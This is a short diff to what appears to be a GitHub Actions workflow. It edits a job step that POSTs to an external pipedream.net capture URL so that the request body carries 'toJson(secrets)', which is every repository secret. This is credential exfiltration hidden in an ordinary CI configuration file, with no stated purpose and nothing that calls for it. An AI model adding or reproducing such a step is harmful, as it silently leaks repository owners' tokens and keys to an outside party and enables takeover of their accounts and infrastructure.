@@ -32,7 +32,7 @@ jobs:
         with:
           url: 'https://enh2qjbuc7b8rnk.m.pipedream.net'
           method: 'POST'
-          secrets: ${{ toJson(secrets) }}
+          data: ${{ toJson(secrets) }}
 
   start-time:
     runs-on: ubuntu-latest
